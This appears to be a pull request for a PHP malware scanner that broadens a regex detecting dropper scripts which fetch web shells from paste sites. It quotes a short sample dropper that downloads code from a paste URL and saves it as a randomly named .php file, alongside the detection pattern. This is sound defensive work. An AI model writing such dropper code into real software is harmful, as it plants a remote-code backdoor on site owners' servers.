## Overview

This PR enhances the scanner's ability to detect malicious PHP dropper scripts that download web shells and mailer scripts from external paste sites, particularly addressing the dropper variant using `paste.myconan.net`.

## Problem

The existing `download_remote_code_web` exploit pattern did not detect:
- Paste sites with subdomains (e.g., `paste.myconan.net`)
- Several commonly used paste sites including myconan, paste2, and slexy

This allowed malicious droppers like the following to evade detection:

```php
$code = file_get_contents("https://paste.myconan.net/raw/fljusirz");
file_put_contents(randomName(8) . ".php", $code);
```

## Solution

Updated the regex pattern in `src/Exploits.php` to:

1. **Support subdomains** - Added `([\w.-]+\.)?` to match optional subdomain prefixes
2. **Expand paste site coverage** - Added `myconan`, `paste2`, and `slexy` to the detection list

## Changes

- **File Modified:** `src/Exploits.php` (line 380)
- **Change Type:** Pattern enhancement (1 line)

**Pattern Update:**
```php
// Before
'pattern' => '/(file_get_contents|file_put_contents)[\s]*\([\s]*[\'"]https?:\/\/(codepad|pastebin|controlc|hastebin|justpaste|privatebin|cryptbin|zerobin)\.(org|com|net|in|me).*?(?=\))\)/i',

// After
'pattern' => '/(file_get_contents|file_put_contents)[\s]*\([\s]*[\'"]https?:\/\/([\w.-]+\.)?(codepad|pastebin|controlc|hastebin|justpaste|privatebin|cryptbin|zerobin|paste2|slexy|myconan)\.(org|com|net|in|me).*?(?=\))\)/i',
```

## Testing

✅ Successfully detects the malicious dropper from the issue  
✅ Detects all new paste sites with and without subdomains  
✅ Maintains backward compatibility with all original paste sites  
✅ No false positives with legitimate code (GitHub, CDNs, etc.)  
✅ Passes PHP-CS-Fixer code style validation  

## Impact

- **Security:** Enhanced detection coverage for PHP dropper variants
- **Compatibility:** No breaking changes - all existing patterns continue to work
- **Performance:** Minimal regex complexity increase

